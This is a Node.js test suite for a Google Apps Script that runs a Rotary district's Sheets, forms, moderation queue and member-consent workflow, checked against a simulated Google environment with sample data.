// Runs the whole Sheet script (dist/apps-script/Code.gs) against a simulated Google environment:
// setup, form submissions, moderation, members and spouses, removals, deceased, clean-up and the data link.
import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { before, beforeEach, test } from 'node:test';
import { createGoogleEnv } from '../helpers/google-mock.mjs';
import { routeOldForms } from '../helpers/forms.mjs';
import { bundleCode } from '../../tools/bundle-apps-script.mjs';
import { core, plain } from '../../lib/core.mjs';

const ROOT = resolve(import.meta.dirname, '../..');
let env;
let token;
const Q = {}; // question titles, read from the script itself

// Google's email allowance is per day; each test counts as a new day (the test on the July check sets its own)
beforeEach(() => { if (env) env.quota.left = 100; });

before(() => {
  env = createGoogleEnv({ sampleJson: readFileSync(resolve(ROOT, 'sample/sample-data.json'), 'utf8') });
  env.load(bundleCode());
  routeOldForms(env); // the old forms' submissions go through the two forms with sections (Release 2)
  Object.assign(Q, env.context.Q);
  env.run('setup');
  token = env.props.get('DATA_TOKEN');
});

const data = () => {
  const r = env.doGet({ mode: 'data', token });
  assert.ok(r.ok, r.error);
  return r.data;
};

test('setup creates every tab, loads the sample, makes five forms and fills their links', () => {
  for (const t of ['settings', 'clubs', 'activities', 'events', 'functionaries', 'members_public', 'couples_public', 'dashboard', 'role_checks']) assert.ok(env.main.getSheetByName(t), t);
  for (const t of ['members_master', 'club_history', 'couples', 'consent_requests', 'removal_requests', 'club_change_requests']) assert.ok(env.priv.getSheetByName(t), t);
  assert.equal(env.main.getSheetByName('Sheet1'), null, 'empty default tab removed');
  assert.equal(env.main.rows('clubs').length, 70);
  assert.equal(env.main.rows('functionaries').length, 181, '176 from the Excel plus 5 sample roles from last year');
  const s = Object.fromEntries(env.main.rows('settings').map((r) => [r.key, r.value]));
  for (const k of ['form_activity_url', 'form_club_updates_url', 'form_show_details_url', 'form_update_details_url', 'form_club_profile_url', 'form_consent_url',
    'form_removal_url', 'form_update_url', 'form_public_service_url', 'form_contact_url', 'form_business_url', 'form_club_change_url']) assert.match(s[k], /^https:\/\/docs\.google\.com\/forms/, k);
  assert.ok(env.main.getSheetByName('raw_activity_form'), 'raw answers tab for the activity form');
  for (const t of ['raw_show_details_form', 'raw_update_details_form']) assert.ok(env.priv.getSheetByName(t), "members' details go to the private Sheet");
  assert.ok(env.priv.getSheetByName('raw_club_updates_form'), 'club changes go to the private Sheet');
  assert.equal(env.triggers.filter((t) => t.getHandlerFunction() === 'onAnyFormSubmit').length, 5);
  assert.ok(env.triggers.some((t) => t.getHandlerFunction() === 'dailyJobs'));
  assert.ok(token && token.length >= 32);
  assert.equal(env.main.rows('dashboard').length, 69, 'one dashboard row per active club');
});

test('running setup again does not duplicate forms, tabs or sample rows', () => {
  env.run('setup');
  assert.equal(env.main.rows('clubs').length, 70);
  assert.equal(env.triggers.filter((t) => t.getHandlerFunction() === 'onAnyFormSubmit').length, 5);
});

test('data link: refuses without the token; same result as the website build on the sample', () => {
  assert.deepEqual(env.doGet({ mode: 'data', token: 'wrong' }), { ok: false, error: 'not allowed' });
  const d = data();
  const sample = JSON.parse(readFileSync(resolve(ROOT, 'sample/sample-data.json'), 'utf8'));
  const local = plain(core.Core_buildPublicData(sample.main, d.generated_at));
  assert.equal(d.activities.length, local.activities.length);
  assert.equal(d.members.length, local.members.length);
  assert.equal(d.couples.length, local.couples.length);
  assert.deepEqual(plain(core.Core_validatePublic(d)), []);
});

test('data link: member card references are keyed hashes; deceased members hold no role this year', () => {
  const d = data();
  const refs = d.officers.concat(d.functionaries).map((r) => r.person_ref).filter(Boolean);
  assert.ok(refs.length > 100 && refs.every((r) => /^P[0-9a-f]{12}$/.test(r)));
  assert.ok(env.props.get('PERSON_SECRET'), 'secret kept in the script properties');
  assert.deepEqual(data().functionaries.map((r) => r.person_ref), d.functionaries.map((r) => r.person_ref), 'card addresses stay the same between builds');
  const dead = env.priv.rows('members_master').find((m) => m.status === 'deceased' && m.is_rotarian === true);
  const year = env.main.rows('settings').find((r) => r.key === 'current_rotary_year').value;
  assert.ok(env.main.rows('officers').some((o) => o.member_id === dead.member_id && o.rotary_year === year), 'the sample has one');
  assert.ok(!d.officers.some((o) => o.name === dead.name && o.rotary_year === year), 'left out of the website');
});

test('Check roles and member IDs: fills the role_checks tab, most urgent first', () => {
  env.run('checkRoles');
  const rows = env.main.rows('role_checks');
  assert.ok(rows.length >= 1);
  assert.match(rows[0].problem, /marked "deceased"/);
  assert.match(env.alerts.at(-1), /role_checks tab/);
});

let newActivityId;
test('an activity sent through the form waits as pending and is not public', () => {
  env.submit('activity', {
    [Q.club]: 'RC Agra North', [Q.name]: 'Rtn Test Secretary', [Q.role]: 'Secretary', [Q.mobile]: '98765 43210', [Q.kind]: Q.kindActivity,
    [Q.aTitle]: 'Winter blankets for night shelters', [Q.aDate]: '2026-10-11', [Q.aTheme]: 'Club service / Other',
    [Q.aDesc]: 'Members distributed 200 blankets at three night shelters in the city with the municipal corporation, before the cold wave.',
    'Photos (up to 3, each under 1 MB)': ['1AbCdEfGhIjKlMnOpQrStUvWxYz0123456'], [Q.aLink]: 'aol.com/post/1', [Q.aHelped]: '200', [Q.aPartners]: ['RC Agra Greater'], [Q.aConsent]: ['yes'],
  });
  const row = env.main.rows('activities').at(-1);
  newActivityId = row.id;
  assert.match(row.id, /^ACT-\d{4}-\d{4}$/);
  assert.equal(row.status, 'pending');
  assert.equal(row.source, 'form');
  assert.equal(row.club_id, 'S-004');
  assert.equal(row.partner_clubs, 'S-002');
  assert.equal(row.photo_files, 'drive:1AbCdEfGhIjKlMnOpQrStUvWxYz0123456');
  const blank = env.main.rows('activities').filter((r) => !r.id).length;
  assert.equal(blank, 0, `${blank} empty rows sit above the new entry (tick-box FALSE rows), so it lands far down the tab`);
  assert.equal(row.submitter_mobile, '98765 43210');
  assert.equal(row.post_link, 'https://aol.com/post/1', 'links typed without https:// are fixed');
  assert.ok(!data().activities.some((a) => a.id === row.id));
});

test('approving stamps who and when, emails the sender, and makes it public with its photo', () => {
  const rowNumber = env.main.rows('activities').findIndex((r) => r.id === newActivityId) + 2;
  env.setActive('activities', rowNumber);
  env.run('approveSelected');
  const row = env.main.rows('activities').find((r) => r.id === newActivityId);
  assert.equal(row.status, 'approved');
  assert.equal(row.approved_by, 'moderator.a@example.com');
  assert.ok(row.approved_at);
  assert.ok(env.mails.some((m) => m.to === 'secretary@example.com' && m.subject.startsWith('Approved')));
  const d = data();
  const pub = d.activities.find((a) => a.id === newActivityId);
  assert.ok(pub, 'approved activity is public');
  assert.deepEqual(pub.photos, ['drive:1AbCdEfGhIjKlMnOpQrStUvWxYz0123456']);
  assert.ok(!JSON.stringify(pub).includes('98765'), 'sender mobile never public');
  const file = env.doGet({ mode: 'file', id: '1AbCdEfGhIjKlMnOpQrStUvWxYz0123456', token });
  assert.ok(file.ok && file.base64);
  assert.equal(env.doGet({ mode: 'file', id: 'someOtherPrivateFile123456789', token }).ok, false, 'only public photos can be fetched');
});

test('data link: a public file list too large for one cache entry is kept in parts and read back whole', () => {
  const list = Array.from({ length: 4000 }, (_, i) => `drive:1LongDriveFileId${String(i).padStart(20, '0')}`);
  env.run('putAllowedFiles_', list);
  assert.equal(JSON.stringify(env.run('getAllowedFiles_')), JSON.stringify(list));
});

test('an activity with neither photo nor link cannot be approved; rejecting emails the reason', () => {
  env.submit('activity', {
    [Q.club]: 'RC Kanpur', [Q.name]: 'Rtn X', [Q.role]: 'Member', [Q.mobile]: '9811111111', [Q.kind]: Q.kindActivity,
    [Q.aTitle]: 'Meeting', [Q.aDate]: '2026-10-10', [Q.aTheme]: 'Club service / Other', [Q.aDesc]: 'x'.repeat(120), [Q.aConsent]: ['yes'],
  }, 'member.x@example.com');
  const rows = env.main.rows('activities');
  const row = rows.at(-1);
  assert.match(row.moderator_note, /No photo or link/);
  env.setActive('activities', rows.length + 1);
  env.run('approveSelected');
  assert.equal(env.main.rows('activities').at(-1).status, 'pending');
  env.prompts.push('Please add a photo');
  env.run('rejectSelected');
  assert.equal(env.main.rows('activities').at(-1).status, 'rejected');
  assert.ok(env.mails.some((m) => m.to === 'member.x@example.com' && m.body.includes('Please add a photo')));
});

test('events go to the events tab as pending', () => {
  env.submit('activity', {
    [Q.club]: 'RC Jhansi', [Q.name]: 'Rtn Y', [Q.role]: 'President', [Q.mobile]: '9822222222', [Q.kind]: Q.kindEvent,
    [Q.eTitle]: 'Blood donation drive', [Q.eType]: 'Club event open to all', [Q.eStart]: '2026-11-14', [Q.eTime]: '09:00',
    [Q.eVenue]: 'Town Hall', [Q.eCity]: 'Jhansi', [Q.eOrganiser]: 'RC Jhansi',
    'Photos (up to 3, each under 1 MB)': ['1EventPhotoAbCdEfGhIjKlMnOpQrSt'],
  });
  const e = env.main.rows('events').at(-1);
  assert.equal(e.status, 'pending');
  assert.equal(e.title, 'Blood donation drive');
  assert.equal(e.start_time, '09:00');
  assert.equal(e.photo_files, 'drive:1EventPhotoAbCdEfGhIjKlMnOpQrSt');
  const rows = env.main.rows('events');
  env.setActive('events', rows.length + 1);
  env.run('approveSelected');
  const pub = data().events.find((x) => x.title === 'Blood donation drive');
  assert.deepEqual(pub.photos, ['drive:1EventPhotoAbCdEfGhIjKlMnOpQrSt'], 'event photos are public once approved');
  assert.ok(env.doGet({ mode: 'file', id: '1EventPhotoAbCdEfGhIjKlMnOpQrSt', token }).ok);
});

test('club profile updates apply to the club only when approved', () => {
  env.submit('club_profile', {
    [Q.club]: 'RC Unnao', [Q.name]: 'Rtn Z', [Q.role]: 'President', [Q.mobile]: '9833333333',
    [Q.pWebsite + ' (optional)']: 'https://rcunnao.example.org', [Q.pMeeting + ' (optional)']: 'Every Monday, 7 pm',
  });
  const unnao = () => env.main.rows('clubs').find((c) => c.club_name === 'RC Unnao');
  assert.equal(unnao().website, '');
  const rows = env.main.rows('club_profile_requests');
  env.setActive('club_profile_requests', rows.length + 1);
  env.run('approveSelected');
  assert.equal(unnao().website, 'https://rcunnao.example.org');
  assert.equal(unnao().meeting_day_place, 'Every Monday, 7 pm');
});

// The two My details forms (owner, 23 Nov 2026): Show my details (List / Do not list) and Update my details
const SHOW = () => env.context.SHOW_ITEMS;
const grid = (listed) => Object.keys(SHOW()).map((k) => (listed.includes(k) ? 'List' : 'Do not list'));
const MEMBER = 'The member';
const CLUB = 'Club President, Secretary or Executive Secretary for the member';
const show = (listed, over = {}) => ({ [Q.cFilledBy]: MEMBER, [Q.showGrid]: grid(listed), [Q.cDeclaration]: ['yes'], ...over });
const update = (over = {}) => ({ [Q.cFilledBy]: MEMBER, [Q.uBusiness]: env.context.BUSINESS_CHOICES.none, [Q.cDeclaration]: ['yes'], ...over });
const forMember = (m) => ({ [Q.cFilledBy]: CLUB, [Q.gMemberId]: m.member_id, [Q.rName]: m.name });
const addPerson = (id, name, clubId, extra = {}) => {
  env.run('appendRow_', env.priv, 'members_master', { member_id: id, name, club_id: clubId, is_rotarian: true, status: 'active', ...extra });
  return env.priv.rows('members_master').find((m) => m.member_id === id);
};
const pendingId = (tab) => env.priv.rows(tab).at(-1).id;
const clubId = (name) => env.main.rows('clubs').find((c) => c.club_name === name).club_id;
const PHOTO = 'My photo (one photo of me alone, under 1 MB)';

test("My details: the member's own Update and Show forms go in at once; only what is listed shows, day and month only", () => {
  addPerson('7654321', 'Rtn Ravi Kumar', clubId('RC Agra North'), { email: 'ravi@example.com', mobile: '9876501234' });
  env.submit('update_details', update({ [Q.cProfession]: 'Chartered accountant', [Q.cArea]: 'Agra', [Q.cWhat]: 'Audit and tax for small businesses.',
    [PHOTO]: ['1PhotoOfRaviKumar0123456789abc'], [Q.cBirthdayDate]: '10-21', [Q.cAnniversaryDate]: '11-05', [Q.cSpouseRotarian]: 'No',
    [Q.cSpouseName]: 'Sunita Kumar', [Q.cSpouseAgrees]: ['yes'] }), 'ravi@example.com', new Date());
  const req = env.priv.rows('consent_requests').at(-1);
  assert.deepEqual([req.form, req.status, req.birthday, req.matched_member_id], ['update', 'approved', '21-10', '7654321']);
  let m = env.priv.rows('members_master').find((x) => x.member_id === '7654321');
  assert.deepEqual([m.profession, m.dob, m.marriage_date], ['Chartered accountant', '21-10', '05-11']);
  assert.ok(!data().members.some((x) => x.name === 'Rtn Ravi Kumar'), 'nothing is shown until the member lists it');

  env.submit('show_details', show(['directory', 'profession', 'photo', 'birthday', 'anniversary', 'whatsapp']), 'ravi@example.com', new Date());
  assert.equal(env.priv.rows('consent_requests').at(-1).status, 'approved');
  m = env.priv.rows('members_master').find((x) => x.member_id === '7654321');
  assert.ok(m.listing_approved === true && m.public_key);
  const d = data();
  const pub = d.members.find((x) => x.name === 'Rtn Ravi Kumar');
  assert.equal(pub.birthday, '10-21');
  assert.equal(pub.contact_link, 'https://wa.me/919876501234');
  assert.equal(pub.call_link, '', 'Call button: Do not list');
  assert.equal(pub.profession, 'Chartered accountant');
  assert.equal(pub.photo, 'drive:1PhotoOfRaviKumar0123456789abc');
  const c = d.couples.find((x) => x.person_a_name === 'Rtn Ravi Kumar');
  assert.ok(c, 'anniversary with a non-member spouse who agreed');
  assert.equal(c.person_b_name, 'Sunita');
  assert.equal(c.anniversary, '11-05', 'month and day, as the site reads it');
  assert.ok(!JSON.stringify(d).includes('7654321'), 'member ID never public');
  assert.ok(!JSON.stringify(d).includes('ravi@example.com'), 'email never public');
});

test('My details: Rotarian spouses need both choices; the anniversary then shows once with both clubs; different dates are held', () => {
  const amit = addPerson('5550001', 'Rtn Amit Sood', clubId('RC Kanpur'), { email: 'amit@example.com' });
  addPerson('5550002', 'Rtn Neha Sood', clubId('RC Kanpur Green'), { email: 'neha@example.com', marriage_date: '' });
  env.submit('update_details', update({ [Q.cAnniversaryDate]: '12-09', [Q.cSpouseRotarian]: 'Yes', [Q.cSpouseName]: 'Rtn Neha Sood',
    [Q.cSpouseClub]: 'RC Kanpur Green', [Q.cSpouseId]: '5550002' }), amit.email, new Date());
  env.submit('show_details', show(['directory', 'anniversary']), amit.email, new Date());
  assert.equal(env.priv.rows('couples').find((c) => c.person_a_id === '5550001').status, 'awaiting_spouse');
  assert.ok(!data().couples.some((c) => c.person_a_name === 'Rtn Amit Sood'));
  env.submit('show_details', show(['directory', 'anniversary']), 'neha@example.com', new Date());
  const couples = data().couples.filter((c) => [c.person_a_name, c.person_b_name].includes('Rtn Amit Sood'));
  assert.equal(couples.length, 1, 'shown once');
  assert.deepEqual([couples[0].person_a_club_id, couples[0].person_b_club_id].sort(), ['S-039', 'S-046']);

  // two spouses who give different dates are held for a moderator
  addPerson('5560001', 'Rtn P One', clubId('RC Aligarh'), { email: 'p.one@example.com' });
  addPerson('5560002', 'Rtn P Two', clubId('RC Aligarh'), { email: 'p.two@example.com' });
  env.submit('update_details', update({ [Q.cAnniversaryDate]: '01-15', [Q.cSpouseRotarian]: 'Yes', [Q.cSpouseName]: 'Rtn P Two', [Q.cSpouseId]: '5560002' }), 'p.one@example.com', new Date());
  env.submit('update_details', update({ [Q.cAnniversaryDate]: '01-16', [Q.cSpouseRotarian]: 'Yes', [Q.cSpouseName]: 'Rtn P One', [Q.cSpouseId]: '5560001' }), 'p.two@example.com', new Date());
  env.submit('show_details', show(['anniversary']), 'p.one@example.com', new Date());
  env.submit('show_details', show(['anniversary']), 'p.two@example.com', new Date());
  assert.equal(env.priv.rows('couples').find((x) => x.person_a_id === '5560001').status, 'check_dates');
  assert.ok(!data().couples.some((x) => x.person_a_name === 'Rtn P One'));
  // a Rotarian spouse is found only by the member ID given; nobody new is made
  const count = env.priv.rows('members_master').length;
  env.submit('update_details', update({ [Q.cAnniversaryDate]: '02-02', [Q.cSpouseRotarian]: 'Yes', [Q.cSpouseName]: 'Rtn Nobody', [Q.cSpouseId]: '9999999' }), 'p.one@example.com', new Date());
  assert.equal(env.priv.rows('members_master').length, count);
  assert.match(env.priv.rows('consent_requests').at(-1).moderator_note, /Anniversary not linked: no Rotarian with the spouse's member ID 9999999/);
});

/* ---------- consent safeguards (1 Nov 2026): who sent it, the member told, a 3-day hold, a confirmation ---------- */

let safeguardClub;
const clubMembers = () => {
  // members of their own, with emails on file, and a President for this Rotary year
  if (safeguardClub) return safeguardClub;
  const club = env.main.rows('clubs')[0];
  const add = (id, name) => addPerson(id, name, club.club_id, { email: id.toLowerCase() + '@example.com' });
  const president = add('SG-P', 'Rtn Guard President');
  env.run('appendRow_', env.main, 'officers', { rotary_year: '2024-25', club_id: club.club_id, member_id: 'SG-P', name: president.name, role: 'President' });
  const others = ['Asha', 'Bimal', 'Chitra', 'Dev', 'Esha', 'Farhan'].map((n, i) => add('SG-' + (i + 1), 'Rtn ' + n + ' Guard'));
  safeguardClub = { clubName: club.club_name, president, others };
  return safeguardClub;
};
const consentCard = (id) => env.run('memberRequests_', false).consent.find((r) => r.id === id);

test("consent safeguards: a form from the member's own email is applied at once: no wait, no moderator, no notice", () => {
  const { others } = clubMembers();
  const m = others[0];
  const before = env.mails.length;
  env.submit('show_details', show(['directory']), m.email, new Date());
  const req = env.priv.rows('consent_requests').at(-1);
  assert.match(req.member_notice, /^Not needed/);
  assert.equal(req.status, 'approved');
  assert.equal(req.approved_by, "automatic: sent from the member's own email");
  const mine = env.mails.slice(before);
  assert.deepEqual(mine.filter((x) => x.to === m.email).map((x) => x.subject), ['Your choices: ' + m.name], 'only the confirmation');
  assert.ok(!mine.some((x) => /Consent form to check/.test(x.subject)), 'no Members moderator alerted');
  assert.equal(env.priv.rows('members_master').find((x) => x.member_id === m.member_id).listing_approved, true);
});

test("consent safeguards: from the club's office bearer, by Rotary ID; the member is emailed, the sender gets a receipt, 3 days to object", () => {
  const { president, others } = clubMembers();
  const m = others[1];
  const before = env.mails.length;
  env.submit('show_details', show(['directory', 'photo'], forMember(m)), president.email, new Date());
  const req = env.priv.rows('consent_requests').at(-1);
  assert.equal(req.matched_member_id, m.member_id);
  const sent = env.mails.slice(before);
  const notice = sent.find((x) => x.to === m.email);
  assert.ok(notice, 'the member hears at the email on file');
  assert.equal(notice.subject, 'Your details were sent to the Rotary District 3110 website');
  assert.ok(notice.body.includes(president.email), 'names who sent it');
  assert.match(notice.body, /Directory listing: my name and club: List/);
  assert.match(notice.body, /Couple photo on our anniversary: Do not list/);
  assert.match(notice.body, /docs\.google\.com\/forms/, 'with the form to change it');
  assert.ok(sent.some((x) => x.to === president.email && /^Received: Show my details for /.test(x.subject)), 'a receipt for the sender');
  assert.match(req.member_notice, /^Told by email/);
  const card = consentCard(req.id);
  assert.equal(card.form, 'Show my details');
  assert.equal(card.sender, 'An office bearer of the club');
  assert.ok(card.holdUntil > new Date().toISOString());
  assert.equal(card.warnings.length, 0, card.warnings.join('|'));
  assert.throws(() => env.run('approveConsent', req.id), /has until .* to object/);
  const n = env.mails.length;
  assert.match(env.run('approveConsent', req.id, true), /^Approved/, 'unless the moderator confirmed with the member');
  assert.match(env.priv.rows('consent_requests').find((r) => r.id === req.id).moderator_note, /^Confirmed with the member or their club by /);
  assert.deepEqual(env.mails.slice(n).map((x) => x.to).sort(), [m.email, president.email].sort(), 'both hear it was approved');

  // after 3 days an office bearer's form can be approved without the tick
  env.submit('update_details', update({ ...forMember(others[2]), [Q.cProfession]: 'Doctor' }), president.email, new Date(Date.now() - 4 * 86400000));
  assert.match(env.run('approveConsent', pendingId('consent_requests')), /^Approved/);
  assert.equal(env.priv.rows('members_master').find((x) => x.member_id === others[2].member_id).profession, 'Doctor');
});

test('consent safeguards: a member nobody can find is told and nothing waits; anyone else must be confirmed; a later own choice blocks an older form', () => {
  const { others } = clubMembers();
  const m = others[3];
  // the member's own form from an email not on file: dropped, the sender told, no moderator
  const before = env.mails.length;
  env.submit('show_details', show(['directory']), 'someone.else@example.com', new Date());
  const lost = env.priv.rows('consent_requests').at(-1);
  assert.deepEqual([lost.status, lost.moderator_note], ['not_matched', 'No member has this email on file: not applied']);
  const told = env.mails.slice(before);
  assert.deepEqual(told.map((x) => x.to), ['someone.else@example.com']);
  assert.match(told[0].body, /second email on the Update my details form/);
  assert.ok(!consentCard(lost.id), 'not on the desk');

  // says it is the club, but is not an office bearer of the member's club, and the name differs
  env.submit('show_details', show(['directory'], { ...forMember(m), [Q.rName]: 'Rtn Somebody Different' }), 'someone.else@example.com', new Date(Date.now() - 5 * 86400000));
  const req = env.priv.rows('consent_requests').at(-1);
  const card = consentCard(req.id);
  assert.equal(card.sender, 'Not the member or a club office bearer');
  assert.ok(card.needsConfirm);
  assert.ok(card.warnings.some((w) => /Says a club office bearer filled it, but someone\.else@example\.com is not the President, Secretary or Executive Secretary/.test(w)), card.warnings.join('|'));
  assert.ok(card.warnings.some((w) => /Matched by member ID, but the name on the form differs/.test(w)), card.warnings.join('|'));
  assert.match(card.match, /^Matches Rtn Dev Guard \(SG-4\)/, 'the name on file beside the name typed');
  assert.throws(() => env.run('approveConsent', req.id), /did not come from the member/);

  // the member then sends their own choices: the older form can no longer be approved
  env.submit('show_details', show([]), m.email, new Date());
  assert.ok(consentCard(req.id).blocked);
  assert.throws(() => env.run('approveConsent', req.id, true), /sent their own choices after this form/);
  env.run('rejectRequest', 'consent', req.id, 'The member objected');

  // a Rotary ID that is nobody's: the moderator is told to reject; nothing is created
  env.submit('show_details', show(['directory'], { [Q.cFilledBy]: CLUB, [Q.gMemberId]: '1231231', [Q.rName]: 'Rtn Ghost' }), 'someone.else@example.com', new Date());
  const ghost = env.priv.rows('consent_requests').at(-1);
  assert.match(ghost.moderator_note, /No member has this Rotary member ID/);
  assert.throws(() => env.run('approveConsent', ghost.id, true), /a form never makes a new member/);
  env.run('rejectRequest', 'consent', ghost.id, 'Unknown ID');
});

test('consent safeguards: the 48-hour reminder leaves out forms still waiting for the member', () => {
  const { president, others } = clubMembers();
  env.submit('show_details', show(['directory'], forMember(others[5])), president.email, new Date(Date.now() - 50 * 3600000));
  const req = env.priv.rows('consent_requests').at(-1);
  const before = env.mails.length;
  env.run('sendReminders_');
  assert.ok(!env.mails.slice(before).some((x) => x.body.includes(req.id)), 'held: not overdue yet');
  env.run('rejectRequest', 'consent', req.id, 'Test over');
  const officers = env.main.getSheetByName('officers');
  officers.deleteRows(env.main.rows('officers').findIndex((o) => o.member_id === 'SG-P') + 2, 1);
});

test('Do not list: either spouse can withdraw the anniversary alone; nothing listed takes the member and photo off', () => {
  env.submit('show_details', show(['directory']), 'neha@example.com', new Date());
  assert.ok(!data().couples.some((c) => [c.person_a_name, c.person_b_name].includes('Rtn Neha Sood')));
  assert.ok(data().members.some((m) => m.name === 'Rtn Amit Sood'), "the other spouse's own listing stays");

  env.submit('show_details', show([]), 'ravi@example.com', new Date());
  const d = data();
  assert.ok(!d.members.some((m) => m.name === 'Rtn Ravi Kumar'));
  assert.ok(!d.couples.some((c) => c.person_a_name === 'Rtn Ravi Kumar'));
  assert.ok(env.trashed.includes('1PhotoOfRaviKumar0123456789abc'), 'photo deleted from Drive');
  assert.ok(env.main.rows('settings').find((x) => x.key === 'content_changed_at').value, 'removals go in the next of the four daily updates');
});

test('mark as deceased stops greetings at once and asks for a rebuild', () => {
  const pubBefore = data().members.find((m) => m.name === 'Rtn Amit Sood');
  assert.ok(pubBefore);
  env.prompts.push('5550001');
  env.run('markDeceased');
  const d = data();
  assert.ok(!d.members.some((m) => m.name === 'Rtn Amit Sood'));
  assert.ok(d.inactive_keys.includes(pubBefore.public_key));
  assert.equal(env.priv.rows('members_master').find((m) => m.member_id === '5550001').status, 'deceased');
});

test('48-hour reminders go to the moderators', () => {
  const sh = env.main.getSheetByName('settings');
  const rows = env.main.rows('settings');
  sh.set(rows.findIndex((r) => r.key === 'moderator_emails') + 2, 2, 'mod1@example.com, mod2@example.com');
  env.submit('activity', {
    [Q.club]: 'RC Kanpur', [Q.name]: 'Rtn Old', [Q.role]: 'Member', [Q.mobile]: '9844444444', [Q.kind]: Q.kindActivity,
    [Q.aTitle]: 'Old entry', [Q.aDate]: '2026-10-01', [Q.aTheme]: 'Club service / Other', [Q.aDesc]: 'y'.repeat(120), [Q.aLink]: 'https://example.com/p', [Q.aConsent]: ['yes'],
  });
  const before = env.mails.length;
  env.run('dailyJobs');
  const mail = env.mails.slice(before).find((m) => m.subject.includes('waiting more than 48 hours'));
  assert.ok(mail, 'reminder sent');
  assert.equal(mail.to, 'mod1@example.com,mod2@example.com');
});

/* ---------- club services and projects, campaigns, event registration, weekly bulletin ---------- */

const settingsMap = () => Object.fromEntries(env.main.rows('settings').map((r) => [r.key, r.value]));
const BLOOD = 'Blood Donation Drive 2026-27 (blood units)';

test('Upgrade Sheet: adds the new questions to the existing forms in place, once; the campaigns tab, settings, lists and weekly emails', () => {
  const ids = JSON.parse(env.props.get('FORM_IDS'));
  const later = [Q.aCampaign, Q.aCampaignCount, Q.eRegClose, Q.eFee];
  // forms created before this change do not have the new questions (the Club updates form, made in Release 2, has its own)
  env.forms[ids.activity].items = env.forms[ids.activity].items.filter((i) => !later.includes(i.title));
  env.run('upgradeSheet');
  env.run('upgradeSheet');
  const act = env.forms[ids.activity].titles();
  const prof = env.forms[ids.club_updates].titles();
  for (const t of later) assert.equal(act.filter((x) => x === t).length, 1, `${t} added once`);
  for (const t of [Q.pProjects, Q.pServices]) assert.equal(prof.filter((x) => x === t).length, 1, t);
  assert.equal(act[act.indexOf(Q.aHelped) + 1], Q.aCampaign);
  assert.equal(act[act.indexOf(Q.aCampaign) + 1], Q.aCampaignCount);
  assert.equal(act[act.indexOf(Q.eEnd) + 1], Q.eRegClose);
  assert.equal(act[act.indexOf(Q.eRegClose) + 1], Q.eFee);
  assert.deepEqual(prof.slice(prof.indexOf(Q.pConfirm) - 2, prof.indexOf(Q.pConfirm) + 1), [Q.pProjects, Q.pServices, Q.pConfirm]);
  const campaignQ = env.forms[ids.activity].items.find((i) => i.title === Q.aCampaign);
  assert.equal(campaignQ.choices[0], 'Not part of a district campaign');
  assert.ok(campaignQ.choices.includes(BLOOD), 'running campaign offered');
  assert.ok(!campaignQ.choices.some((c) => c.startsWith('School Health')), 'a campaign that ended more than 30 days ago is not offered');
  assert.match(env.forms[ids.club_updates].items.find((i) => i.title === "Our club's details").help, /permanent projects and regular services/);
  assert.ok(env.main.getSheetByName('campaigns'));
  const s = settingsMap();
  assert.equal(String(s.campaign_check_above), '1000');
  for (const k of ['bulletin_start_date', 'bulletin_emails']) assert.ok(k in s, k);
  assert.equal(env.main.rows('lists').filter((r) => r.list === 'registration_status').length, 4);
  for (const fn of ['bulletinPreview', 'bulletinMessage']) assert.equal(env.triggers.filter((t) => t.getHandlerFunction() === fn).length, 1, fn);
});

test('a campaign report is filed with its campaign and count; moderators get notes on what to check', () => {
  const base = { [Q.club]: 'RC Kanpur', [Q.name]: 'Rtn C', [Q.role]: 'Secretary', [Q.mobile]: '9855555555', [Q.kind]: Q.kindActivity,
    [Q.aTheme]: 'Fighting disease', [Q.aDesc]: 'z'.repeat(120), [Q.aLink]: 'https://example.com/camp', [Q.aConsent]: ['yes'] };
  env.submit('activity', { ...base, [Q.aTitle]: 'Blood camp at the town hall', [Q.aDate]: '2026-10-04', [Q.aCampaign]: BLOOD, [Q.aCampaignCount]: '1,500' });
  let row = env.main.rows('activities').at(-1);
  assert.equal(row.campaign_id, 'BLOOD-2026-27');
  assert.equal(row.campaign_count, 1500);
  assert.match(row.moderator_note, /Check the campaign count/);
  assert.match(row.moderator_note, /Another club reported this campaign on the same date \(ACT-\d{4}-\d{4}, RC Jhansi\)/);
  env.submit('activity', { ...base, [Q.aTitle]: 'Second camp', [Q.aDate]: '2026-10-09', [Q.aCampaign]: 'Not part of a district campaign', [Q.aCampaignCount]: '40' });
  row = env.main.rows('activities').at(-1);
  assert.equal(row.campaign_id, '');
  assert.match(row.moderator_note, /Count given without a campaign/);
  env.submit('activity', { ...base, [Q.aTitle]: 'Old camp', [Q.aDate]: '2026-06-15', [Q.aCampaign]: BLOOD, [Q.aCampaignCount]: '10' });
  assert.match(env.main.rows('activities').at(-1).moderator_note, /outside the campaign period/);
});

test('event registration answers are filed; a fee with payment details gets a note and never reaches the website', () => {
  env.submit('activity', {
    [Q.club]: 'RC Jhansi', [Q.name]: 'Rtn E', [Q.role]: 'President', [Q.mobile]: '9877777777', [Q.kind]: Q.kindEvent,
    [Q.eTitle]: 'Charity walk to the fort', [Q.eType]: 'Club event open to all', [Q.eStart]: '2026-11-20', [Q.eVenue]: 'Jhansi Fort',
    [Q.eCity]: 'Jhansi', [Q.eOrganiser]: 'RC Jhansi', [Q.eRegClose]: '2026-11-15', [Q.eFee]: '₹100, pay by UPI',
  });
  const rows = env.main.rows('events');
  const e = rows.at(-1);
  assert.equal(e.registration_close_date, '2026-11-15');
  assert.equal(e.fee, '₹100, pay by UPI');
  assert.match(e.moderator_note, /payment details/);
  env.setActive('events', rows.length + 1);
  env.run('approveSelected');
  const d = data();
  const pub = d.events.find((x) => x.id === e.id);
  assert.equal(pub.registration_close_date, '2026-11-15');
  assert.equal(pub.fee, '');
  assert.ok(d.skipped_items.includes(`event ${e.id} fee`));
});

test('club profile: projects and services get notes; a blank answer keeps the list, "none" clears it, anything else replaces it', () => {
  const jhansi = () => env.main.rows('clubs').find((c) => c.club_name === 'RC Jhansi');
  const projectsBefore = jhansi().permanent_projects;
  assert.ok(projectsBefore);
  const send = (answers) => {
    env.submit('club_profile', { [Q.club]: 'RC Jhansi', [Q.name]: 'Rtn P', [Q.role]: 'President', [Q.mobile]: '9866666666', ...answers });
    const rows = env.main.rows('club_profile_requests');
    env.setActive('club_profile_requests', rows.length + 1);
    return rows.at(-1);
  };
  const req = send({ [Q.pServices]: 'Blood bank desk – Sundays – Rotary Bhawan\nCall 98765 43210 for help', [Q.pProjects]: '' });
  assert.match(req.moderator_note, /phone number or email/);
  env.run('approveSelected');
